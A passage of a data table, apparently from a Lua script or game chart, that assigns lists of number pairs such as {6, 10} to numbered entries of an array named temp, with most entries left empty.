	temp[213] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[214] = {}
	temp[215] = {}
	temp[216] = {}
	temp[217] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[218] = {}
	temp[219] = {}
	temp[220] = {}
	temp[221] = {{6, 11}, {6, 15}, {6, 6}, {6, -1}, }
	temp[222] = {}
	temp[223] = {}
	temp[224] = {}
	temp[225] = {}
	temp[226] = {}
	temp[227] = {}
	temp[228] = {}
	temp[229] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[230] = {}
	temp[231] = {}
	temp[232] = {}
	temp[233] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[234] = {}
	temp[235] = {}
	temp[236] = {}
	temp[237] = {{6, 3}, {6, 6}, {6, 11}, {6, -4}, }
	temp[238] = {}
	temp[239] = {}
	temp[240] = {}
	temp[241] = {{6, 5}, {6, 8}, {6, 13}, {6, 1}, }
	temp[242] = {}
	temp[243] = {}
	temp[244] = {}
	temp[245] = {{6, 6}, {6, 11}, {6, 15}, {6, 1}, }
	temp[246] = {}
	temp[247] = {}
	temp[248] = {}
	temp[249] = {{6, 8}, {6, 13}, {6, 17}, {6, -11}, }
	temp[250] = {}
	temp[251] = {}
	temp[252] = {}
	temp[253] = {}
	temp[254] = {}
	temp[255] = {}
	temp[256] = {}
	temp[257] = {}
	temp[258] = {}
	temp[259] = {}
	temp[260] = {}
	temp[261] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[262] = {}
	temp[263] = {}
	temp[264] = {}
	temp[265] = {}
	temp[266] = {}
	temp[267] = {}
	temp[268] = {}
	temp[269] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[270] = {}
	temp[271] = {}
	temp[272] = {}
	temp[273] = {}
	temp[274] = {}
	temp[275] = {}
	temp[276] = {}
	temp[277] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[278] = {}
	temp[279] = {}
	temp[280] = {}
	temp[281] = {}
	temp[282] = {}
	temp[283] = {}
	temp[284] = {}
	temp[285] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[286] = {}
	temp[287] = {}
	temp[288] = {}
	temp[289] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[290] = {}
	temp[291] = {}
	temp[292] = {}
	temp[293] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[294] = {}
	temp[295] = {}
	temp[296] = {}
	temp[297] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[298] = {}
	temp[299] = {}
	temp[300] = {}
	temp[301] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[302] = {}
	temp[303] = {}
	temp[304] = {}
	temp[305] = {{6, 8}, {6, 5}, {6, 1}, }
	temp[306] = {}
	temp[307] = {}
	temp[308] = {}
	temp[309] = {{6, -11}, }
	temp[310] = {}
	temp[311] = {}
	temp[312] = {}
	temp[313] = {}
	temp[314] = {}
	temp[315] = {}
	temp[316] = {}
	temp[317] = {{6, -11}, }
	temp[318] = {}
	temp[319] = {}
	temp[320] = {}
	temp[321] = {{6, -6}, }
	temp[322] = {}
	temp[323] = {}
	temp[324] = {}
	temp[325] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[326] = {}
	temp[327] = {}
	temp[328] = {}
	temp[329] = {}
	temp[330] = {}
	temp[331] = {}
	temp[332] = {}
	temp[333] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[334] = {}
	temp[335] = {}
	temp[336] = {}
	temp[337] = {}
	temp[338] = {}
	temp[339] = {}
	temp[340] = {}
	temp[341] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[342] = {}
	temp[343] = {}
	temp[344] = {}
	temp[345] = {}
	temp[346] = {}
	temp[347] = {}
	temp[348] = {}
	temp[349] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[350] = {}
	temp[351] = {}
	temp[352] = {}
	temp[353] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[354] = {}
	temp[355] = {}
	temp[356] = {}
	temp[357] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[358] = {}
	temp[359] = {}
	temp[360] = {}
	temp[361] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[362] = {}
	temp[363] = {}
	temp[364] = {}
	temp[365] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[366] = {}
	temp[367] = {}
	temp[368] = {}
	temp[369] = {{6, 8}, {6, 5}, {6, 1}, }
	temp[370] = {}
	temp[371] = {}
	temp[372] = {}
	temp[373] = {{6, -11}, }
	temp[374] = {}
	temp[375] = {}
	temp[376] = {}
	temp[377] = {}
	temp[378] = {}
	temp[379] = {}
	temp[380] = {}
	temp[381] = {{6, -11}, }
	temp[382] = {}
	temp[383] = {}
	temp[384] = {}
	temp[385] = {{6, -6}, }
	temp[386] = {}
	temp[387] = {}
	temp[388] = {}
	temp[389] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[390] = {}
	temp[391] = {}
	temp[392] = {}
	temp[393] = {}
	temp[394] = {}
	temp[395] = {}
	temp[396] = {}
	temp[397] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[398] = {}
	temp[399] = {}
	temp[400] = {}
	temp[401] = {}
	temp[402] = {}
	temp[403] = {}
	temp[404] = {}
	temp[405] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[406] = {}
	temp[407] = {}
	temp[408] = {}
	temp[409] = {}
	temp[410] = {}
	temp[411] = {}
	temp[412] = {}
	temp[413] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[414] = {}
	temp[415] = {}
	temp[416] = {}
	temp[417] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[418] = {}
	temp[419] = {}
	temp[420] = {}
	temp[421] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[422] = {}
	temp[423] = {}
	temp[424] = {}
	temp[425] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[426] = {}
	temp[427] = {}
	temp[428] = {}
	temp[429] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[430] = {}
	temp[431] = {}
	temp[432] = {}
	temp[433] = {{6, 8}, {6, 5}, {6, 1}, }
	temp[434] = {}
	temp[435] = {}
	temp[436] = {}
	temp[437] = {{6, -11}, }
	temp[438] = {}
	temp[439] = {}
	temp[440] = {}
	temp[441] = {}
	temp[442] = {}
	temp[443] = {}
	temp[444] = {}
	temp[445] = {{6, -11}, }
	temp[446] = {}
	temp[447] = {}
	temp[448] = {}
	temp[449] = {{6, -6}, }
	temp[450] = {}
	temp[451] = {}
	temp[452] = {}
	temp[453] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[454] = {}
	temp[455] = {}
	temp[456] = {}
	temp[457] = {}
	temp[458] = {}
	temp[459] = {}
	temp[460] = {}
	temp[461] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[462] = {}
	temp[463] = {}
	temp[464] = {}
	temp[465] = {}
	temp[466] = {}
	temp[467] = {}
	temp[468] = {}
	temp[469] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[470] = {}
	temp[471] = {}
	temp[472] = {}
	temp[473] = {}
	temp[474] = {}
	temp[475] = {}
	temp[476] = {}
	temp[477] = {{6, 10}, {6, 6}, {6, 1}, }
	temp[478] = {}
	temp[479] = {}
	temp[480] = {}
	temp[481] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[482] = {}
	temp[483] = {}
	temp[484] = {}
	temp[485] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[486] = {}
	temp[487] = {}
	temp[488] = {}
	temp[489] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[490] = {}
	temp[491] = {}
	temp[492] = {}
	temp[493] = {{6, 11}, {6, 8}, {6, 3}, }
	temp[494] = {}
	temp[495] = {}
	temp[496] = {}
	temp[497] = {{6, 8}, {6, 5}, {6, 1}, }
	temp[498] = {}
	temp[499] = {}
	temp[500] = {}
	temp[501] = {{6, -11}, }
	temp[502] = {}
	temp[503] = {}
	temp[504] = {}
	temp[505] = {}
	temp[506] = {}
	temp[507] = {}
	temp[508] = {}
	temp[509] = {{6, 1}, {6, -11}, }
	temp[510] = {}
	temp[511] = {}
	temp[512] = {}
	temp[513] = {{6, 10}, {6, -6}, }
	temp[514] = {}
	temp[515] = {}
	temp[516] = {}
	temp[517] = {{6, 10}, {6, 13}, {6, 6}, }
	temp[518] = {}
	temp[519] = {}
	temp[520] = {}
	temp[521] = {{6, 8}, }
	temp[522] = {}
	temp[523] = {}
	temp[524] = {}
	temp[525] = {{6, 13}, {6, 6}, }
	temp[526] = {}
	temp[527] = {}
	temp[528] = {}
	temp[529] = {{6, 6}, {6, -2}, }
	temp[530] = {}
	temp[531] = {}
	temp[532] = {}
	temp[533] = {}
	temp[534] = {}
	temp[535] = {}
	temp[536] = {}
	temp[537] = {{6, 13}, {6, 5}, }
	temp[538] = {}
	temp[539] = {}
	temp[540] = {}
	temp[541] = {{6, 5}, }
	temp[542] = {}
	temp[543] = {}
	temp[544] = {}
	temp[545] = {{6, 3}, {6, -1}, }
	temp[546] = {}
	temp[547] = {}
	temp[548] = {}
	temp[549] = {{6, 11}, {6, 3}, }
	temp[550] = {}
	temp[551] = {}
	temp[552] = {}
	temp[553] = {{6, 3}, }
	temp[554] = {}
	temp[555] = {}
	temp[556] = {}
	temp[557] = {{6, 8}, {6, 11}, {6, 3}, }
	temp[558] = {}
	temp[559] = {}
	temp[560] = {}
	temp[561] = {{6, -4}, }
	temp[562] = {}
	temp[563] = {}
	temp[564] = {}
	temp[565] = {{6, 8}, }
	temp[566] = {}
	temp[567] = {}
	temp[568] = {}
	temp[569] = {{6, 15}, {6, 11}, }
	temp[570] = {}
	temp[571] = {}
	temp[572] = {}
	temp[573] = {{6, 6}, }
	temp[574] = {}
	temp[575] = {}
	temp[576] = {}
	temp[577] = {{6, 5}, {6, 1}, }
	temp[578] = {}
	temp[579] = {}
	temp[580] = {}
	temp[581] = {{6, 13}, {6, 5}, }
	temp[582] = {}
	temp[583] = {}
	temp[584] = {}
	temp[585] = {{6, 5}, }
	temp[586] = {}
	temp[587] = {}
	temp[588] = {}
	temp[589] = {{6, 13}, {6, 5}, }
	temp[590] = {}
	temp[591] = {}
	temp[592] = {}
	temp[593] = {{6, -7}, }
	temp[594] = {}
	temp[595] = {}
	temp[596] = {}
	temp[597] = {{6, 3}, }
	temp[598] = {}
	temp[599] = {}
	temp[600] = {}
	temp[601] = {{6, 5}, {6, 11}, {6, 8}, }
	temp[602] = {}
	temp[603] = {}
	temp[604] = {}
	temp[605] = {}
	temp[606] = {}
	temp[607] = {}
	temp[608] = {}
	temp[609] = {{6, 3}, }
	temp[610] = {}
	temp[611] = {}
	temp[612] = {}
	temp[613] = {}
	temp[614] = {}
	temp[615] = {}
	temp[616] = {}
	temp[617] = {{6, 1}, }
	temp[618] = {}
	temp[619] = {}
	temp[620] = {}
	temp[621] = {{6, 1}, {6, 11}, {6, 8}, {6, 3}, {6, -6}, }
	temp[622] = {}
	temp[623] = {}
	temp[624] = {}
	temp[625] = {}
	temp[626] = {}
	temp[627] = {}
	temp[628] = {}
	temp[629] = {{6, 10}, {6, 6}, {6, 1}, {6, -6}, }
	temp[630] = {}
	temp[631] = {}
	temp[632] = {}
	temp[633] = {{6, 10}, {6, 6}, {6, 1}, {6, -6}, }
	temp[634] = {}
	temp[635] = {}
	temp[636] = {}
	temp[637] = {{6, 1}, }
	temp[638] = {}
	temp[639] = {}
	temp[640] = {}
	temp[641] = {{6, 10}, {6, -6}, }
	temp[642] = {}
	temp[643] = {}
	temp[644] = {}
	temp[645] = {{6, 10}, {6, 13}, {6, 6}, }
	temp[646] = {}
	temp[647] = {}
	temp[648] = {}
	temp[649] = {{6, 8}, }
	temp[650] = {}
	temp[651] = {}
	temp[652] = {}
	temp[653] = {{6, 13}, {6, 6}, }
	temp[654] = {}
	temp[655] = {}
	temp[656] = {}
	temp[657] = {{6, 6}, {6, -2}, }
	temp[658] = {}
	temp[659] = {}
	temp[660] = {}
	temp[661] = {}
	temp[662] = {}
	temp[663] = {}
	temp[664] = {}
	temp[665] = {{6, 13}, {6, 5}, }
	temp[666] = {}
	temp[667] = {}
	temp[668] = {}
	temp[669] = {{6, 5}, }
	temp[670] = {}
	temp[671] = {}
	temp[672] = {}
	temp[673] = {{6, 3}, {6, -1}, }
	temp[674] = {}
	temp[675] = {}
	temp[676] = {}
	temp[677] = {{6, 11}, {6, 3}, }
	temp[678] = {}
	temp[679] = {}
	temp[680] = {}
	temp[681] = {}
	temp[682] = {}
	temp[683] = {}
	temp[684] = {}
	temp[685] = {{6, 8}, {6, 11}, {6, 3}, }
	temp[686] = {}
	temp[687] = {}
	temp[688] = {}
	temp[689] = {{6, -4}, }
	temp[690] = {}
	temp[691] = {}
	temp[692] = {}
	temp[693] = {{6, 8}, }
	temp[694] = {}
	temp[695] = {}
	temp[696] = {}
	temp[697] = {{6, 8}, {6, 15}, {6, 11}, }
	temp[698] = {}
	temp[699] = {}
	temp[700] = {}
	temp[701] = {{6, 6}, }
	temp[702] = {}
	temp[703] = {}
	temp[704] = {}
	temp[705] = {{6, 13}, {6, 5}, {6, 1}, }
	temp[706] = {}
	temp[707] = {}
	temp[708] = {}
	temp[709] = {{6, 5}, }
	temp[710] = {}
	temp[711] = {}
	temp[712] = {}
	temp[713] = {}
	temp[714] = {}
	temp[715] = {}
	temp[716] = {}
	temp[717] = {{6, 5}, }
	temp[718] = {}
	temp[719] = {}
	temp[720] = {}
	temp[721] = {}
	temp[722] = {}
	temp[723] = {}
	temp[724] = {}
	temp[725] = {}
	temp[726] = {}
	temp[727] = {}
	temp[728] = {}
	temp[729] = {{6, 13}, {6, 8}, {6, 5}, {6, 1}, }
	temp[730] = {}
	temp[731] = {}
	temp[732] = {}
	temp[733] = {}
	temp[734] = {}
	temp[735] = {}
	temp[736] = {}
	temp[737] = {{6, 3}, {6, 15}, {6, 11}, {6, 6}, {6, -4}, }
	temp[738] = {}
	temp[739] = {}
	temp[740] = {}
	temp[741] = {}
	temp[742] = {}
	temp[743] = {}
	temp[744] = {}
	temp[745] = {{6, 5}, {6, 17}, {6, 13}, {6, 8}, {6, 1}, }
	temp[746] = {}
	temp[747] = {}
	temp[748] = {}
	temp[749] = {{6, 6}, {6, 18}, {6, 13}, {6, 10}, {6, -6}, }
	temp[750] = {}
	temp[751] = {}
	temp[752] = {}
	temp[753] = {}
	temp[754] = {}
	temp[755] = {}
	temp[756] = {}
	temp[757] = {{6, 6}, }
	temp[758] = {}
	temp[759] = {}
	temp[760] = {}
	temp[761] = {}
	temp[762] = {}
	temp[763] = {}
	temp[764] = {}
	temp[765] = {{6, 3}, }
	temp[766] = {}
	temp[767] = {}
	temp[768] = {}
	temp[769] = {{6, 1}, {6, -11}, }
	temp[770] = {}
	temp[771] = {}
	temp[772] = {}
	temp[773] = {{6, 1}, {6, -11}, }
	temp[774] = {}
	temp[775] = {}
	temp[776] = {}
	temp[777] = {{6, 1}, {6, 17}, {6, 8}, }
	temp[778] = {}
	temp[779] = {}
	temp[780] = {}
	temp[781] = {{6, 13}, {6, 5}, }
	temp[782] = {}
	temp[783] = {}
	temp[784] = {}
	temp[785] = {{6, -7}, }
	temp[786] = {}
	temp[787] = {}
	temp[788] = {}
	temp[789] = {{6, 3}, {6, 8}, {6, 11}, }
	temp[790] = {}
	temp[791] = {}
	temp[792] = {}
	temp[793] = {}
	temp[794] = {}
	temp[795] = {}
	temp[796] = {}
	temp[797] = {{6, 3}, {6, 8}, {6, 11}, {6, -6}, }
	temp[798] = {}
	temp[799] = {}
	temp[800] = {}
	temp[801] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[802] = {}
	temp[803] = {}
	temp[804] = {}
	temp[805] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[806] = {}
	temp[807] = {}
	temp[808] = {}
	temp[809] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[810] = {}
	temp[811] = {}
	temp[812] = {}
	temp[813] = {{6, -11}, }
	temp[814] = {}
	temp[815] = {}
	temp[816] = {}
	temp[817] = {{6, -11}, }
	temp[818] = {}
	temp[819] = {}
	temp[820] = {}
	temp[821] = {{6, 6}, }
	temp[822] = {}
	temp[823] = {}
	temp[824] = {}
	temp[825] = {{6, -6}, }
	temp[826] = {}
	temp[827] = {}
	temp[828] = {}
	temp[829] = {{6, 3}, }
	temp[830] = {}
	temp[831] = {}
	temp[832] = {}
	temp[833] = {{6, 1}, {6, -11}, }
	temp[834] = {}
	temp[835] = {}
	temp[836] = {}
	temp[837] = {{6, 1}, {6, -11}, }
	temp[838] = {}
	temp[839] = {}
	temp[840] = {}
	temp[841] = {{6, 1}, {6, 17}, {6, 8}, }
	temp[842] = {}
	temp[843] = {}
	temp[844] = {}
	temp[845] = {{6, 13}, {6, 5}, }
	temp[846] = {}
	temp[847] = {}
	temp[848] = {}
	temp[849] = {{6, -7}, }
	temp[850] = {}
	temp[851] = {}
	temp[852] = {}
	temp[853] = {{6, 3}, {6, 8}, {6, 11}, }
	temp[854] = {}
	temp[855] = {}
	temp[856] = {}
	temp[857] = {}
	temp[858] = {}
	temp[859] = {}
	temp[860] = {}
	temp[861] = {{6, 3}, {6, 8}, {6, 11}, {6, -6}, }
	temp[862] = {}
	temp[863] = {}
	temp[864] = {}
	temp[865] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[866] = {}
	temp[867] = {}
	temp[868] = {}
	temp[869] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[870] = {}
	temp[871] = {}
	temp[872] = {}
	temp[873] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[874] = {}
	temp[875] = {}
	temp[876] = {}
	temp[877] = {{6, -11}, }
	temp[878] = {}
	temp[879] = {}
	temp[880] = {}
	temp[881] = {{6, -11}, }
	temp[882] = {}
	temp[883] = {}
	temp[884] = {}
	temp[885] = {{6, 6}, }
	temp[886] = {}
	temp[887] = {}
	temp[888] = {}
	temp[889] = {{6, -6}, }
	temp[890] = {}
	temp[891] = {}
	temp[892] = {}
	temp[893] = {{6, 3}, }
	temp[894] = {}
	temp[895] = {}
	temp[896] = {}
	temp[897] = {{6, 1}, {6, -11}, }
	temp[898] = {}
	temp[899] = {}
	temp[900] = {}
	temp[901] = {{6, 1}, {6, -11}, }
	temp[902] = {}
	temp[903] = {}
	temp[904] = {}
	temp[905] = {{6, 1}, {6, -11}, }
	temp[906] = {}
	temp[907] = {}
	temp[908] = {}
	temp[909] = {}
	temp[910] = {}
	temp[911] = {}
	temp[912] = {}
	temp[913] = {{6, 3}, {6, -9}, }
	temp[914] = {}
	temp[915] = {}
	temp[916] = {}
	temp[917] = {}
	temp[918] = {}
	temp[919] = {}
	temp[920] = {}
	temp[921] = {{6, 5}, {6, -7}, }
	temp[922] = {}
	temp[923] = {}
	temp[924] = {}
	temp[925] = {{6, 6}, {6, -6}, }
	temp[926] = {}
	temp[927] = {}
	temp[928] = {}
	temp[929] = {}
	temp[930] = {}
	temp[931] = {}
	temp[932] = {}
	temp[933] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[934] = {}
	temp[935] = {}
	temp[936] = {}
	temp[937] = {}
	temp[938] = {}
	temp[939] = {}
	temp[940] = {}
	temp[941] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[942] = {}
	temp[943] = {}
	temp[944] = {}
	temp[945] = {{6, 15}, {6, 20}, {6, 11}, }
	temp[946] = {}
	temp[947] = {}
	temp[948] = {}
	temp[949] = {{6, 15}, {6, 20}, {6, 11}, }
	temp[950] = {}
	temp[951] = {}
	temp[952] = {}
	temp[953] = {{6, 1}, {6, 13}, {6, 18}, {6, 10}, }
	temp[954] = {}
	temp[955] = {}
	temp[956] = {}
	temp[957] = {{6, 1}, }
	temp[958] = {}
	temp[959] = {}
	temp[960] = {}
	temp[961] = {{6, 10}, {6, -6}, }
	temp[962] = {}
	temp[963] = {}
	temp[964] = {}
	temp[965] = {{6, 13}, {6, 6}, }
	temp[966] = {}
	temp[967] = {}
	temp[968] = {}
	temp[969] = {{6, 8}, }
	temp[970] = {}
	temp[971] = {}
	temp[972] = {}
	temp[973] = {{6, 8}, {6, 13}, {6, 6}, }
	temp[974] = {}
	temp[975] = {}
	temp[976] = {}
	temp[977] = {{6, 6}, {6, -2}, }
	temp[978] = {}
	temp[979] = {}
	temp[980] = {}
	temp[981] = {{6, 6}, }
	temp[982] = {}
	temp[983] = {}
	temp[984] = {}
	temp[985] = {{6, 13}, {6, 5}, }
	temp[986] = {}
	temp[987] = {}
	temp[988] = {}
	temp[989] = {{6, 5}, }
	temp[990] = {}
	temp[991] = {}
	temp[992] = {}
	temp[993] = {{6, 3}, {6, -1}, }
	temp[994] = {}
	temp[995] = {}
	temp[996] = {}
	temp[997] = {{6, 11}, {6, 3}, }
	temp[998] = {}
	temp[999] = {}
	temp[1000] = {}
	temp[1001] = {{6, 3}, }
	temp[1002] = {}
	temp[1003] = {}
	temp[1004] = {}
	temp[1005] = {{6, 11}, {6, 3}, }
	temp[1006] = {}
	temp[1007] = {}
	temp[1008] = {}
	temp[1009] = {{6, 8}, {6, -4}, }
	temp[1010] = {}
	temp[1011] = {}
	temp[1012] = {}
	temp[1013] = {}
	temp[1014] = {}
	temp[1015] = {}
	temp[1016] = {}
	temp[1017] = {{6, 8}, {6, 15}, {6, 11}, }
	temp[1018] = {}
	temp[1019] = {}
	temp[1020] = {}
	temp[1021] = {{6, 6}, }
	temp[1022] = {}
	temp[1023] = {}
	temp[1024] = {}
	temp[1025] = {{6, 5}, {6, 1}, }
	temp[1026] = {}
	temp[1027] = {}
	temp[1028] = {}
	temp[1029] = {{6, 13}, {6, 5}, }
	temp[1030] = {}
	temp[1031] = {}
	temp[1032] = {}
	temp[1033] = {{6, 5}, }
	temp[1034] = {}
	temp[1035] = {}
	temp[1036] = {}
	temp[1037] = {{6, 13}, {6, 5}, }
	temp[1038] = {}
	temp[1039] = {}
	temp[1040] = {}
	temp[1041] = {{6, 5}, {6, -4}, }
	temp[1042] = {}
	temp[1043] = {}
	temp[1044] = {}
	temp[1045] = {}
	temp[1046] = {}
	temp[1047] = {}
	temp[1048] = {}
	temp[1049] = {{6, 3}, {6, 11}, {6, 8}, }
	temp[1050] = {}
	temp[1051] = {}
	temp[1052] = {}
	temp[1053] = {{6, 5}, }
	temp[1054] = {}
	temp[1055] = {}
	temp[1056] = {}
	temp[1057] = {{6, 3}, }
	temp[1058] = {}
	temp[1059] = {}
	temp[1060] = {}
	temp[1061] = {}
	temp[1062] = {}
	temp[1063] = {}
	temp[1064] = {}
	temp[1065] = {{6, 1}, }
	temp[1066] = {}
	temp[1067] = {}
	temp[1068] = {}
	temp[1069] = {{6, 1}, {6, 11}, {6, 8}, {6, 3}, {6, -6}, }
	temp[1070] = {}
	temp[1071] = {}
	temp[1072] = {}
	temp[1073] = {}
	temp[1074] = {}
	temp[1075] = {}
	temp[1076] = {}
	temp[1077] = {{6, 10}, {6, 6}, {6, 1}, {6, -6}, }
	temp[1078] = {}
	temp[1079] = {}
	temp[1080] = {}
	temp[1081] = {{6, 10}, {6, 6}, {6, 1}, {6, -6}, }
	temp[1082] = {}
	temp[1083] = {}
	temp[1084] = {}
	temp[1085] = {{6, 10}, }
	temp[1086] = {}
	temp[1087] = {}
	temp[1088] = {}
	temp[1089] = {{6, 10}, {6, -6}, }
	temp[1090] = {}
	temp[1091] = {}
	temp[1092] = {}
	temp[1093] = {{6, 13}, {6, 6}, }
	temp[1094] = {}
	temp[1095] = {}
	temp[1096] = {}
	temp[1097] = {{6, 8}, }
	temp[1098] = {}
	temp[1099] = {}
	temp[1100] = {}
	temp[1101] = {{6, 8}, {6, 13}, {6, 6}, }
	temp[1102] = {}
	temp[1103] = {}
	temp[1104] = {}
	temp[1105] = {{6, 6}, {6, -2}, }
	temp[1106] = {}
	temp[1107] = {}
	temp[1108] = {}
	temp[1109] = {}
	temp[1110] = {}
	temp[1111] = {}
	temp[1112] = {}
	temp[1113] = {{6, 13}, {6, 5}, }
	temp[1114] = {}
	temp[1115] = {}
	temp[1116] = {}
	temp[1117] = {{6, 3}, }
	temp[1118] = {}
	temp[1119] = {}
	temp[1120] = {}
	temp[1121] = {{6, -1}, }
	temp[1122] = {}
	temp[1123] = {}
	temp[1124] = {}
	temp[1125] = {{6, 11}, {6, 3}, }
	temp[1126] = {}
	temp[1127] = {}
	temp[1128] = {}
	temp[1129] = {{6, 3}, }
	temp[1130] = {}
	temp[1131] = {}
	temp[1132] = {}
	temp[1133] = {{6, 11}, {6, 3}, }
	temp[1134] = {}
	temp[1135] = {}
	temp[1136] = {}
	temp[1137] = {{6, 8}, {6, -4}, }
	temp[1138] = {}
	temp[1139] = {}
	temp[1140] = {}
	temp[1141] = {}
	temp[1142] = {}
	temp[1143] = {}
	temp[1144] = {}
	temp[1145] = {{6, 8}, {6, 15}, {6, 11}, }
	temp[1146] = {}
	temp[1147] = {}
	temp[1148] = {}
	temp[1149] = {{6, 6}, }
	temp[1150] = {}
	temp[1151] = {}
	temp[1152] = {}
	temp[1153] = {{6, 13}, {6, 5}, {6, 1}, }
	temp[1154] = {}
	temp[1155] = {}
	temp[1156] = {}
	temp[1157] = {}
	temp[1158] = {}
	temp[1159] = {}
	temp[1160] = {}
	temp[1161] = {{6, 5}, }
	temp[1162] = {}
	temp[1163] = {}
	temp[1164] = {}
	temp[1165] = {{6, 5}, }
	temp[1166] = {}
	temp[1167] = {}
	temp[1168] = {}
	temp[1169] = {}
	temp[1170] = {}
	temp[1171] = {}
	temp[1172] = {}
	temp[1173] = {}
	temp[1174] = {}
	temp[1175] = {}
	temp[1176] = {}
	temp[1177] = {{6, 13}, {6, 1}, {6, -11}, }
	temp[1178] = {}
	temp[1179] = {}
	temp[1180] = {}
	temp[1181] = {{6, 13}, {6, 1}, {6, -11}, }
	temp[1182] = {}
	temp[1183] = {}
	temp[1184] = {}
	temp[1185] = {}
	temp[1186] = {}
	temp[1187] = {}
	temp[1188] = {}
	temp[1189] = {{6, 15}, {6, 3}, {6, -9}, }
	temp[1190] = {}
	temp[1191] = {}
	temp[1192] = {}
	temp[1193] = {{6, 17}, {6, 5}, {6, -7}, }
	temp[1194] = {}
	temp[1195] = {}
	temp[1196] = {}
	temp[1197] = {}
	temp[1198] = {}
	temp[1199] = {}
	temp[1200] = {}
	temp[1201] = {{6, 18}, {6, 6}, {6, -6}, }
	temp[1202] = {}
	temp[1203] = {}
	temp[1204] = {}
	temp[1205] = {}
	temp[1206] = {}
	temp[1207] = {}
	temp[1208] = {}
	temp[1209] = {{6, 6}, }
	temp[1210] = {}
	temp[1211] = {}
	temp[1212] = {}
	temp[1213] = {{6, 3}, }
	temp[1214] = {}
	temp[1215] = {}
	temp[1216] = {}
	temp[1217] = {{6, 1}, {6, -11}, }
	temp[1218] = {}
	temp[1219] = {}
	temp[1220] = {}
	temp[1221] = {{6, 1}, {6, -11}, }
	temp[1222] = {}
	temp[1223] = {}
	temp[1224] = {}
	temp[1225] = {{6, 1}, {6, 17}, {6, 8}, }
	temp[1226] = {}
	temp[1227] = {}
	temp[1228] = {}
	temp[1229] = {{6, 13}, {6, 5}, }
	temp[1230] = {}
	temp[1231] = {}
	temp[1232] = {}
	temp[1233] = {{6, -7}, }
	temp[1234] = {}
	temp[1235] = {}
	temp[1236] = {}
	temp[1237] = {{6, 3}, {6, 8}, {6, 11}, }
	temp[1238] = {}
	temp[1239] = {}
	temp[1240] = {}
	temp[1241] = {}
	temp[1242] = {}
	temp[1243] = {}
	temp[1244] = {}
	temp[1245] = {{6, 3}, {6, 8}, {6, 11}, {6, -6}, }
	temp[1246] = {}
	temp[1247] = {}
	temp[1248] = {}
	temp[1249] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[1250] = {}
	temp[1251] = {}
	temp[1252] = {}
	temp[1253] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[1254] = {}
	temp[1255] = {}
	temp[1256] = {}
	temp[1257] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[1258] = {}
	temp[1259] = {}
	temp[1260] = {}
	temp[1261] = {{6, -11}, }
	temp[1262] = {}
	temp[1263] = {}
	temp[1264] = {}
	temp[1265] = {{6, -11}, }
	temp[1266] = {}
	temp[1267] = {}
	temp[1268] = {}
	temp[1269] = {{6, 6}, }
	temp[1270] = {}
	temp[1271] = {}
	temp[1272] = {}
	temp[1273] = {{6, -6}, }
	temp[1274] = {}
	temp[1275] = {}
	temp[1276] = {}
	temp[1277] = {{6, 3}, }
	temp[1278] = {}
	temp[1279] = {}
	temp[1280] = {}
	temp[1281] = {{6, 1}, {6, -11}, }
	temp[1282] = {}
	temp[1283] = {}
	temp[1284] = {}
	temp[1285] = {{6, 1}, {6, -11}, }
	temp[1286] = {}
	temp[1287] = {}
	temp[1288] = {}
	temp[1289] = {{6, 1}, {6, 17}, {6, 8}, }
	temp[1290] = {}
	temp[1291] = {}
	temp[1292] = {}
	temp[1293] = {{6, 13}, {6, 5}, }
	temp[1294] = {}
	temp[1295] = {}
	temp[1296] = {}
	temp[1297] = {{6, -7}, }
	temp[1298] = {}
	temp[1299] = {}
	temp[1300] = {}
	temp[1301] = {{6, 3}, {6, 8}, {6, 11}, }
	temp[1302] = {}
	temp[1303] = {}
	temp[1304] = {}
	temp[1305] = {}
	temp[1306] = {}
	temp[1307] = {}
	temp[1308] = {}
	temp[1309] = {{6, 3}, {6, 8}, {6, 11}, {6, -6}, }
	temp[1310] = {}
	temp[1311] = {}
	temp[1312] = {}
	temp[1313] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[1314] = {}
	temp[1315] = {}
	temp[1316] = {}
	temp[1317] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[1318] = {}
	temp[1319] = {}
	temp[1320] = {}
	temp[1321] = {{6, 1}, {6, 6}, {6, 10}, }
	temp[1322] = {}
	temp[1323] = {}
